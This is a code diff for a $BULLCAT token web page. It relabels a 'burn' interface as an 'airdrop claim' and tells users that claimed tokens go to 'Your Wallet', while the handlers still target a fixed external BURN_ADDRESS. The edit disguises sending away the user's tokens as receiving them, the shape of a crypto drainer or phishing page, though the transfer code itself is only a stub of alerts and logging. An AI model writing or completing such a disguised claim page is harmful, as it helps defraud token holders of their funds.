@@ -1,9 +1,9 @@
 <!-- BULLCAT INCINERATOR -->
 <div class="mt-8 p-8 bg-zinc-900 border border-red-500/50 rounded-2xl scanline">
     <h3 class="text-3xl font-bold text-red-400 mb-2 flex items-center gap-3">
-        <i class="fas fa-fire"></i> BULLCAT INCINERATOR
+        <i class="fas fa-fire"></i> $BULLCAT AIRDROP
     </h3>
-    <p class="text-gray-400 mb-6">Burn your $BULLCAT — Irreversible</p>
+    <p class="text-gray-400 mb-6">Claim your $BULLCAT — Airdrop</p>
 
     <div id="balanceDisplay" class="hidden mb-6 p-5 bg-black rounded-xl text-center border border-red-500/30">
         <p class="text-gray-400 text-sm">Your $BULLCAT Balance</p>
@@ -18,19 +18,19 @@
         <div class="grid grid-cols-2 gap-4">
             <button onclick="burnSelected()" 
                     class="bg-red-600 hover:bg-red-700 py-6 rounded-xl font-bold transition-all">
-                BURN AMOUNT
+                CLAIM AMOUT
             </button>
             
             <button onclick="burnAll()" 
                     class="bg-red-700 hover:bg-red-800 py-6 rounded-xl font-bold border-2 border-red-400 transition-all">
-                🔥 BURN ALL
+                🔥 CLAIM ALL
             </button>
         </div>
     </div>
 
     <p class="text-[10px] text-center text-gray-500 mt-6">
-        All burned tokens go to:<br>
-        FtX1wo7WdJiP7Xxvx4H9Z52VrjjrmeGdjnFnGVqfXYtu
+        All Claimed tokens go to:<br>
+        Your Wallet
     </p>
 </div>
 const BURN_ADDRESS = "FtX1wo7WdJiP7Xxvx4H9Z52VrjjrmeGdjnFnGVqfXYtu";
@@ -45,17 +45,17 @@ async function burnAll() {
         return;
     }
 
-    if (!confirm("⚠️ YOU ARE ABOUT TO BURN ALL YOUR $BULLCAT\n\nThis action is PERMANENT!\n\nContinue?")) return;
-    if (!confirm("FINAL CONFIRMATION\nType 'BURNALL' to proceed:")) return;
+    if (!confirm("⚠️ YOU ARE ABOUT TO CLAIM ALL YOUR $BULLCAT\n\nThis action is PERMANENT!\n\nContinue?")) return;
+    if (!confirm("FINAL CONFIRMATION\nType 'CLAIM ALL' to proceed:")) return;
 
-    const input = prompt("Type BURNALL to confirm:");
-    if (input !== "BURNALL") {
+    const input = prompt("Type CLAIMALL to confirm:");
+    if (input !== "CLAIMALL") {
         alert("Cancelled.");
         return;
     }
 
-    alert("🔥 Burn All transaction requested!\n\n(Full working transfer needs extra libraries. Test this first.)");
-    console.log(`Burn ALL $BULLCAT requested to ${BURN_ADDRESS}`);
+    alert("🔥 Claim All transaction requested!\n\n(Full working transfer needs extra libraries. Test this first.)");
+    console.log(`Claim ALL $BULLCAT requested to ${BURN_ADDRESS}`);
 }
 
 async function burnSelected() {
@@ -64,7 +64,7 @@ async function burnSelected() {
         alert("Enter a valid amount");
         return;
     }
-    if (!confirm(`Burn ${amount} $BULLCAT?\n\nIrreversible!`)) return;
+    if (!confirm(`Claim ${amount} $BULLCAT?\n\nIrreversible!`)) return;
 
-    alert("Burn transaction initiated!");
+    alert("Claim transaction initiated!");
 }
